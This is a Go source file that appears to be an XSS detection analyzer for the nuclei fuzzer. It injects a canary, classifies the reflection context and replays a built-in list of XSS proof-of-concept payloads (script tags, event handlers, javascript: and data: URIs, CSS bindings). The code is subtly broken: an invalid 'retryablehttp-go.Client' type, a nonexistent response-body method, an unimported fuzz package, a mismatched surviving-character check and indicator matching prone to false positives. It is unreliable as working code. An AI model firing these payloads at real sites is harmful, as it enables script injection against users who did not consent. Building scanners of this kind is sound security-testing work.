package xss

import (
	"fmt"
	"net/http"
	"regexp"
	"strings"

	"github.com/projectdiscovery/nuclei/v3/pkg/fuzz/analyzers"
	"github.com/projectdiscovery/retryablehttp-go"
)

// Analyzer implements the XSS analyzer for nuclei fuzzer
type Analyzer struct {
	contextAnalyzer *ContextAnalyzer
	canary          string
	payloads        map[Context][]string
}

// NewAnalyzer creates a new XSS analyzer
func NewAnalyzer() *Analyzer {
	return &Analyzer{
		contextAnalyzer: NewContextAnalyzer(),
		canary:          "NucleiXSSCanary",
		payloads:        buildPayloads(),
	}
}

// Name returns the name of the analyzer
func (a *Analyzer) Name() string {
	return "xss"
}

// ApplyInitialTransformation applies the initial canary transformation
func (a *Analyzer) ApplyInitialTransformation(data string, params map[string]interface{}) string {
	// Inject canary with XSS-critical characters
	return fmt.Sprintf("%s<>'\"/=%s", a.canary, data)
}

// Analyze is the main function for XSS analysis
func (a *Analyzer) Analyze(options *analyzers.Options) (bool, string, error) {
	response := options.FuzzGenerated.Response
	originalRequest := options.FuzzGenerated.Request
	
	// Step 1: Check if canary is reflected (case-insensitive)
	if !a.contextAnalyzer.IsCaseInsensitiveMatch(response.Body, a.canary) {
		return false, "", nil // No reflection
	}
	
	// Step 2: Analyze the context of reflection
	context := a.detectContext(response.Body, originalRequest.Body)
	
	// Step 3: Detect which special characters survive
	survivingChars := a.detectSurvivingChars(response.Body)
	
	// Step 4: Select context-appropriate payloads
	selectedPayloads := a.selectPayloads(context, survivingChars)
	
	// Step 5: Replay with selected payloads and verify XSS
	xssConfirmed, proof := a.replayPayloads(options, selectedPayloads)
	
	if xssConfirmed {
		return true, proof, nil
	}
	
	return false, "", nil
}

// detectContext detects the XSS context from response
func (a *Analyzer) detectContext(response string, request string) Context {
	return a.contextAnalyzer.AnalyzeContext(response, a.canary)
}

// detectSurvivingChars detects which special characters survive encoding
func (a *Analyzer) detectSurvivingChars(response string) []string {
	surviving := []string{}
	
	// Check each critical character
	criticalChars := []string{"<", ">", "'", "\"", "/", "=", "\\"}
	
	for _, char := range criticalChars {
		encoded := fmt.Sprintf("%s%s%s", a.canary, char, a.canary)
		if strings.Contains(response, encoded) {
			surviving = append(surviving, char)
		}
	}
	
	return surviving
}

// selectPayloads selects appropriate payloads based on context and surviving chars
func (a *Analyzer) selectPayloads(ctx Context, surviving []string) []string {
	selected := []string{}
	
	// Get payloads for this context
	contextPayloads := a.payloads[ctx]
	
	// Filter payloads based on surviving characters
	for _, payload := range contextPayloads {
		if a.payloadCompatible(payload, surviving) {
			selected = append(selected, payload)
		}
	}
	
	return selected
}

// payloadCompatible checks if a payload is compatible with surviving chars
func (a *Analyzer) payloadCompatible(payload string, surviving []string) bool {
	// Simple check: if payload requires a char that doesn't survive, skip it
	requiredChars := map[string][]string{
		"<script>": {"<", ">", "/"},
		"onerror=": {"=", "\""},
		"javascript:": {":"},
	}
	
	for required, chars := range requiredChars {
		if strings.Contains(payload, required) {
			for _, char := range chars {
				if !containsString(surviving, char) {
					return false
				}
			}
		}
	}
	
	return true
}

// replayPayloads replays selected payloads and checks for XSS
func (a *Analyzer) replayPayloads(options *analyzers.Options, payloads []string) (bool, string) {
	for _, payload := range payloads {
		// Create new request with payload
		newRequest := options.FuzzGenerated.Request.Clone()
		newRequest.Body = strings.Replace(newRequest.Body, a.canary, payload, -1)
		
		// Send request
		resp, err := options.HttpClient.Do(newRequest.Request)
		if err != nil {
			continue
		}
		
		// Check if payload is reflected unencoded
		if a.isPayloadReflected(resp, payload) {
			return true, payload
		}
	}
	
	return false, ""
}

// isPayloadReflected checks if payload is reflected without encoding
func (a *Analyzer) isPayloadReflected(resp *http.Response, payload string) bool {
	body := resp.Body.String()
	
	// Check for direct reflection (unencoded)
	if strings.Contains(body, payload) {
		return true
	}
	
	// Check for common XSS indicators
	xssIndicators := []string{
		"<script>",
		"alert(",
		"onerror=",
		"onload=",
		"javascript:",
	}
	
	for _, indicator := range xssIndicators {
		if strings.Contains(body, indicator) {
			return true
		}
	}
	
	return false
}

// buildPayloads builds context-specific XSS payloads
func buildPayloads() map[Context][]string {
	return map[Context][]string{
		ContextScript: {
			"<script>alert(1)</script>",
			"</script><script>alert(1)</script>",
			"<script>prompt(1)</script>",
			"'><script>alert(1)</script>",
			"\"><script>alert(1)</script>",
		},
		ContextAttribute: {
			"\" onerror=\"alert(1)",
			"' onerror='alert(1)",
			"\" onload=\"alert(1)",
			"' onload='alert(1)",
			"javascript:alert(1)",
		},
		ContextHTML: {
			"<img src=x onerror=alert(1)>",
			"<svg onload=alert(1)>",
			"<body onload=alert(1)>",
			"<iframe src=\"javascript:alert(1)\">",
			"<img src=x srcset=\"javascript:alert(1)\">",
		},
		ContextURL: {
			"javascript:alert(1)",
			"data:text/html,<script>alert(1)</script>",
			"vbscript:alert(1)",
			"javascript:prompt(1)",
		},
		ContextCSS: {
			"expression(alert(1))",
			"url(javascript:alert(1))",
			"-moz-binding:url(\"data:text/xml,<binding xmlns='http://www.mozilla.org/xbl' id='xss'><implementation><constructor>alert(1)</constructor></implementation></binding>\")",
		},
		ContextUnknown: {
			// Generic payloads for unknown contexts
			"<script>alert(1)</script>",
			"<img src=x onerror=alert(1)>",
			"javascript:alert(1)",
		},
	}
}

// containsString checks if a slice contains a string
func containsString(slice []string, str string) bool {
	for _, s := range slice {
		if s == str {
			return true
		}
	}
	return false
}

// Register the analyzer
func init() {
	analyzers.RegisterAnalyzer("xss", NewAnalyzer())
}

// Helper functions for compatibility

// GetContextAnalyzer returns the context analyzer instance
func GetContextAnalyzer() *ContextAnalyzer {
	analyzer := NewAnalyzer()
	return analyzer.contextAnalyzer
}

// AnalyzeXSSContext is a convenience function for analyzing XSS context
func AnalyzeXSSContext(response string, reflection string) Context {
	analyzer := GetContextAnalyzer()
	return analyzer.AnalyzeContext(response, reflection)
}

// IsXSSContextExecutable checks if a context allows XSS execution
func IsXSSContextExecutable(ctx Context) bool {
	return IsExecutableContext(ctx)
}

// GetXSSPayloadsForContext returns payloads suitable for a given context
func GetXSSPayloadsForContext(ctx Context) []string {
	analyzer := NewAnalyzer()
	return analyzer.payloads[ctx]
}

// DetectXSSVulnerability performs a complete XSS vulnerability detection
func DetectXSSVulnerability(client *retryablehttp-go.Client, request *http.Request, response *http.Response) (bool, string, error) {
	analyzer := NewAnalyzer()
	
	// Create analyzer options
	opts := &analyzers.Options{
		HttpClient: client,
	}
	
	// Set up fuzz generated request
	opts.FuzzGenerated = fuzz.GeneratedRequest{
		Request:  request,
		Response: response,
	}
	
	// Run analysis
	found, proof, err := analyzer.Analyze(opts)
	return found, proof, err
}
